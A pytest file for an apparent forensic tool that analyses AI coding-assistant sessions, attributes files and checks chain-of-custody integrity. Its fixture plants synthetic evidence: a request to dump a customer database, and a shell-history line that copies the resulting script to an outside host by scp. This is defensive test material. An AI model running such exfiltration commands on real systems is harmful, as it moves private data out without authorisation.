from __future__ import annotations

import json
from datetime import UTC, datetime
from pathlib import Path

import pytest
from typer.testing import CliRunner

from aitrace.acquisition import verify
from aitrace.acquisition.custody import CustodyLog
from aitrace.cli.main import app
from aitrace.core.kinds import FindingCategory, Severity
from aitrace.db.store import CaseStore

RUNNER = CliRunner()
SESSION_ID = "2222bbbb-0000-0000-0000-000000000002"
DUMP_PY = "import sqlite3\nimport csv\n\nconn = sqlite3.connect('customers.db')\n"
E = int(datetime(2026, 10, 3, 1, 0, 0, tzinfo=UTC).timestamp())

LAYOUT = (
    "case.sqlite",
    "custody.jsonl",
    "logs/aitrace.log",
    "report/report.html",
    "report/prompts.html",
    "report/report.pdf",
    "report/report.docx",
    "report/report.json",
    "report/csv/timeline.csv",
    "report/csv/ai_queries.csv",
    "report/csv/findings.csv",
    "report/csv/attributions.csv",
    "report/csv/file_lifecycle.csv",
    "report/csv/exfil.csv",
    "export/manifest.csv",
    "export/manifest.json",
)


def _write(root: Path, rel: str, content: str) -> None:
    path = root / rel
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content, encoding="utf-8")


@pytest.fixture
def evidence(tmp_path: Path) -> Path:
    root = tmp_path / "evidence"
    session = [
        {
            "type": "user",
            "sessionId": SESSION_ID,
            "cwd": "/home/park/app",
            "timestamp": "2026-10-03T01:00:00Z",
            "message": {"role": "user", "content": "고객 DB를 덤프해서 csv로 저장하는 코드"},
        },
        {
            "type": "assistant",
            "sessionId": SESSION_ID,
            "cwd": "/home/park/app",
            "timestamp": "2026-10-03T01:00:20Z",
            "message": {
                "role": "assistant",
                "model": "claude-opus-4",
                "content": [
                    {"type": "text", "text": "작성하겠습니다"},
                    {
                        "type": "tool_use",
                        "id": "toolu_1",
                        "name": "Write",
                        "input": {"file_path": "/home/park/app/dump.py", "content": DUMP_PY},
                    },
                ],
            },
        },
    ]
    _write(
        root,
        f"home/park/.claude/projects/-home-park-app/{SESSION_ID}.jsonl",
        "\n".join(json.dumps(row, ensure_ascii=False) for row in session) + "\n",
    )
    _write(root, "home/park/app/dump.py", DUMP_PY)
    _write(
        root,
        "home/park/.bash_history",
        f"#{E}\nclaude\n#{E + 200}\nscp /home/park/app/dump.py park@198.51.100.30:/srv/\n",
    )
    _write(root, "etc/os-release", 'NAME="Ubuntu"\nID=ubuntu\n')
    return root


def _analyze(evidence: Path, case_dir: Path, *extra: str) -> tuple[int, str]:
    result = RUNNER.invoke(
        app,
        ["analyze", str(evidence), "--case-dir", str(case_dir), "--case-number", "T-1", "--examiner", "QA", *extra],
    )
    return result.exit_code, result.output


def test_analyze_dir_tree_writes_full_layout_with_intact_custody(evidence: Path, tmp_path: Path) -> None:
    case_dir = tmp_path / "case"

    code, output = _analyze(evidence, case_dir)

    assert code == 0, output
    missing = [rel for rel in LAYOUT if not (case_dir / rel).is_file()]
    assert missing == []
    assert any(p.is_file() for p in (case_dir / "export/files").rglob("*"))
    custody = CustodyLog(case_dir / "custody.jsonl")
    assert custody.verify_chain() is True
    entries = custody.entries()
    actions = [e["action"] for e in entries]
    for action in ("case_opened", "evidence_intake", "evidence_opened", "plugins_run", "analyzer_run"):
        assert action in actions
    analyzers = [e["detail"]["analyzer"] for e in entries if e["action"] == "analyzer_run"]
    assert analyzers == ["ai_sessions", "file_correlation", "exfil_channels", "attribution"]
    rendered = {e["detail"]["path"]: e["detail"]["sha256"] for e in entries if e["action"] == "report_rendered"}
    assert set(rendered) == {rel for rel in LAYOUT if rel.startswith("report/")}
    for rel, digest in rendered.items():
        assert digest in output
        assert rel in output
    model = json.loads((case_dir / "report/report.json").read_text(encoding="utf-8"))
    assert any("고객 DB를 덤프해서" in row["text"] for row in model["ai_queries"])
    assert any(row["verdict"] == "ai_generated" for row in model["attribution"])
    assert model["exfil"]
    assert "evidence_reverified" in [row["action"] for row in model["custody"]]


def test_analyze_reverify_mismatch_writes_integrity_finding_and_exits_3(
    evidence: Path, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(verify, "reverify", lambda ev: ("mismatch", {}))
    case_dir = tmp_path / "case"

    code, output = _analyze(evidence, case_dir, "--formats", "json")

    assert code == 3, output
    store = CaseStore(case_dir / "case.sqlite")
    try:
        integrity = store.findings(FindingCategory.INTEGRITY)
        statuses = [ev.verification_status for ev in store.evidences()]
    finally:
        store.close()
    assert [f.severity for f in integrity] == [Severity.HIGH]
    assert statuses == ["mismatch"]
    model = json.loads((case_dir / "report/report.json").read_text(encoding="utf-8"))
    rows = {row["id"]: row for row in model["coverage"]["findings"]}
    assert rows[integrity[0].id]["severity"] == "high"
    assert CustodyLog(case_dir / "custody.jsonl").verify_chain() is True


def test_analyze_refuses_case_dir_inside_evidence_dir(evidence: Path) -> None:
    case_dir = evidence / "case"

    code, output = _analyze(evidence, case_dir)

    assert code == 4, output
    assert not case_dir.exists()


def test_analyze_refuses_non_empty_case_dir_without_force(evidence: Path, tmp_path: Path) -> None:
    case_dir = tmp_path / "case"
    _write(case_dir, "keep.txt", "examiner notes")

    code, output = _analyze(evidence, case_dir, "--formats", "json")

    assert code == 4, output
    assert sorted(p.name for p in case_dir.iterdir()) == ["keep.txt"]


def test_report_refuses_edited_custody_log(evidence: Path, tmp_path: Path) -> None:
    case_dir = tmp_path / "case"
    code, output = _analyze(evidence, case_dir, "--formats", "json")
    assert code == 0, output
    custody_path = case_dir / "custody.jsonl"
    lines = custody_path.read_text(encoding="utf-8").splitlines()
    first = json.loads(lines[0])
    first["detail"]["examiner"] = "someone else"
    lines[0] = json.dumps(first, sort_keys=True, ensure_ascii=False)
    custody_path.write_text("\n".join(lines) + "\n", encoding="utf-8")

    result = RUNNER.invoke(app, ["report", "--case-dir", str(case_dir), "--formats", "json"])

    assert result.exit_code == 6, result.output


def test_report_rerenders_intact_case(evidence: Path, tmp_path: Path) -> None:
    case_dir = tmp_path / "case"
    code, output = _analyze(evidence, case_dir, "--formats", "json")
    assert code == 0, output

    result = RUNNER.invoke(app, ["report", "--case-dir", str(case_dir), "--formats", "json,csv", "--lang", "en"])

    assert result.exit_code == 0, result.output
    assert (case_dir / "report/csv/timeline.csv").is_file()
    assert CustodyLog(case_dir / "custody.jsonl").verify_chain() is True
